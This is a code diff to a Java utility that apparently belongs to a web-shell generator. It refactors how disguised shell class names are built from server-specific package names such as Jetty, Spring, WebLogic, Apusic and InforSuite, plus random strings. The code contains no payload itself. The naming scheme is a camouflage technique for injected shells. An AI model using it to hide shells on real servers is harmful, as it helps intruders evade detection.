@@ -111,38 +111,35 @@ public class CommonUtil {
         return className + "$Proxy0$$Lambda$1";
     }
 
-    public static String generateShellClassName(String server, String shellType) {
-        String packageName;
+    public static String getWebPackageNameForServer(String server) {
         switch (server) {
             case Jetty:
-                packageName = "org.eclipse.jetty.servlet.handlers";
-                break;
+                return "org.eclipse.jetty.servlet.handlers";
             case Undertow:
-                packageName = "io.undertow.servlet.handlers";
-                break;
+                return "io.undertow.servlet.handlers";
             case SpringWebMvc:
-                packageName = "org.springframework.boot.mvc.handlers";
-                break;
+                return "org.springframework.boot.mvc.handlers";
             case SpringWebFlux:
-                packageName = "org.springframework.boot.webflux.handlers";
-                break;
+                return "org.springframework.boot.webflux.handlers";
             case WebSphere:
-                packageName = "com.ibm.ws.webcontainer.handlers";
-                break;
+                return "com.ibm.ws.webcontainer.handlers";
             case WebLogic:
-                packageName = "weblogic.servlet.internal.handlers";
-                break;
+                return "weblogic.servlet.internal.handlers";
             case Resin:
-                packageName = "com.caucho.server.dispatch.handlers";
-                break;
+                return "com.caucho.server.dispatch.handlers";
             case BES:
-                packageName = "com.bes.enterprise.webtier.web.handlers";
-                break;
+                return "com.bes.enterprise.webtier.web.handlers";
+            case Apusic:
+                return "com.apusic.web.handlers";
+            case InforSuite:
+                return "com.cvicse.inforsuite.web.handlers";
             default:
-                packageName = "org.apache.http.web.handlers";
-                break;
+                return "org.apache.http.web.handlers";
         }
-        return packageName
+    }
+
+    public static String generateShellClassName(String server, String shellType) {
+        return getWebPackageNameForServer(server)
                 + "." + getRandomString(5)
                 + "." + MIDDLEWARE_NAMES[new Random().nextInt(MIDDLEWARE_NAMES.length)] + shellType;
     }
